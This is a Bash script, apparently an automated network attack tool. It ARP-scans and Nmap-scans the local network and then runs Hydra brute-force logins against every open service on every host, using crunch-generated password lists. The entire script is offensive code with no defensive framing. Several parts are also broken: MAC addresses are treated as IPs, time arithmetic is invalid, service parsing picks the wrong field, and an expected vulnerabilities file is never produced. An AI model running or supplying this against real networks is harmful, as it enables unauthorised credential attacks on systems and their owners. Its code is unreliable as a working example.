#!/bin/bash

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "This script must be run as root."
        exit 1
    fi
}

# Function to display usage message
usage() {
    cat <<-EOM
Usage: $0 [-u user_list] [-p pass_list] [-h]
Options:
  -u  Specify a user list file.
  -p  Specify a password list file.
  -h  Display this help message.
EOM
}

# Function to check and install required apps
check_and_install_apps() {
    local apps=("nmap" "searchsploit" "hydra" "crunch" "masscan" "arp-scan")
    for app in "${apps[@]}"; do
        if ! command -v "$app" &>/dev/null; then
            echo "$app is not installed. Installing..."
            case "$app" in
                "searchsploit")
                    sudo apt-get install exploitdb -y
                    ;;
                "masscan")
                    sudo apt-get install masscan -y
                    ;;
                *)
                    sudo apt-get install "$app" -y
                    ;;
            esac
        fi
    done
}

# Function to generate a password list using crunch
generate_password_list() {
    local min_length="$1"
    local max_length="$2"
    local charset="$3"
    local pass_list="pass_list.txt"
    
    if [[ "$min_length" -ge "$max_length" || -z "$charset" ]]; then
        echo "Invalid password parameters. Please provide valid values."
        exit 1
    fi
    
    echo "Generating password list using crunch..."
    crunch "$min_length" "$max_length" "$charset" -o "$pass_list"
    echo "Password list created: $pass_list"
}

# Function to parse command line arguments
parse_arguments() {
    while getopts "u:p:h" opt; do
        case "$opt" in
            u)
                user_list="$OPTARG"
                ;;
            p)
                pass_list="$OPTARG"
                ;;
            h)
                usage
                exit 0
                ;;
            *)
                usage
                exit 1
                ;;
        esac
    done
}

# Function to check if user_list is provided, if not, create one
check_user_list() {
    if [[ -z "$user_list" ]]; then
        echo "User list not provided."
        user_list="user_list.txt"
        echo "Creating a default user list: $user_list"
        echo "Enter usernames one per line. Press Ctrl+D when finished."
        
        while read -r username; do
            if [[ -n "$username" ]]; then
                echo "$username" >> "$user_list"
            fi
        done
        
        if [[ ! -s "$user_list" ]]; then
            echo "No valid usernames provided. Please try again."
            rm "$user_list"
            check_user_list
        fi
    fi
}

# Function to check if pass_list is provided, if not, create one
check_pass_list() {
    if [[ -z "$pass_list" ]]; then
        echo "Password list not provided."
        pass_list="pass_list.txt"
        echo "Generating a default password list..."
        
        read -rp "Enter minimum password length: " min_length
        read -rp "Enter maximum password length: " max_length
        read -rp "Enter character set for passwords (e.g., abc123): " charset
        
        generate_password_list "$min_length" "$max_length" "$charset"
    fi
}

# Function to identify LAN network range
identify_network_range() {
    local default_gateway
    default_gateway=$(ip route | grep default | awk '{print $3}')
    local network_range
    network_range=$(ipcalc -n -b "$default_gateway" | grep Network | awk '{print $2}')
    echo "$network_range"
}

# Function to perform a quick ARP scan and translate it to IP addresses
arp_scan() {
    local network_range="$1"
    echo "Performing a quick ARP scan..."
    arp-scan --localnet -I "$(ip route | grep default | awk '{print $5}')" | grep -oE '([0-9A-Fa-f]{2}:?){6}' > arp_scan.txt
    awk '{print $1}' arp_scan.txt > ip_addresses.txt
}

# Function to scan live hosts for open ports
scan_live_hosts() {
    local network_range="$1"
    echo "Scanning live hosts for open ports using Nmap..."
    nmap -p- "$network_range" -oG nmap_live_hosts.txt
}

# Function to perform service scans for open ports
service_scan() {
    local host="$1"
    local port="$2"
    echo "Performing a service scan on $host:$port using Nmap..."
    nmap -sV -p "$port" "$host" -oG nmap_service_scan.txt
}

# Function to brute force weak passwords
brute_force_passwords() {
    local host="$1"
    local user_list="$2"
    local pass_list="$3"
    local open_services="$4"
    
    for service_port in $open_services; do
        # Extract the service name and port number
        service_name="$(echo "$service_port" | cut -d':' -f1)"
        port_number="$(echo "$service_port" | cut -d':' -f2)"
        
        # Perform a brute force attack on the service
        echo "Brute forcing $service_name on $host:$port_number using Hydra..."
        hydra -L "$user_list" -P "$pass_list" "$host" "$service_name" -s "$port_number" -o "result_${host}_${port_number}.txt"
    done
}

# Function to display general statistics
display_statistics() {
    local end_time
    end_time=$(date)
    local live_hosts
    live_hosts=$(wc -l < ip_addresses.txt)
    local start_time
    start_time=$(cat script_start_time.txt)
    local total_time
    total_time=$((end_time - start_time))
    echo "Scan completed at: $end_time"
    echo "Total time (secs): $total_time"
    echo "Number of live hosts found: $live_hosts"
}

# Function to save results into a report
save_report() {
    local report_file="scan_report.txt"
    cat nmap_live_hosts.txt > "$report_file"
    { cat vulnerabilities.txt; cat result_*; } >> "$report_file"
}

# Function to display relevant findings for a given IP address
display_findings() {
    local ip="$1"
    grep -A 1 "$ip" nmap_live_hosts.txt
    grep "$ip" vulnerabilities.txt
    grep "$ip" result_*
}

# Main function
main() {
    check_root
    check_and_install_apps
    parse_arguments "$@"
    check_user_list
    check_pass_list
    network_range=$(identify_network_range)
    date +%s > script_start_time.txt
    arp_scan "$network_range"
    scan_live_hosts "$(cat ip_addresses.txt)"

    while IFS= read -r host; do
        open_ports=$(grep -A 1 "$host" nmap_live_hosts.txt | grep "Ports:" | sed 's/.*Ports://' | tr ',' '\n' | awk -F'/' '{print $1":"$4}' | tr -d ' ')
        brute_force_passwords "$host" "$user_list" "$pass_list" "$open_ports"
    done < "ip_addresses.txt"

    display_statistics
    save_report

    read -rp "Enter an IP address to display relevant findings: " ip_address
    display_findings "$ip_address"
}

# Call the main function and pass all script arguments
main "$@"

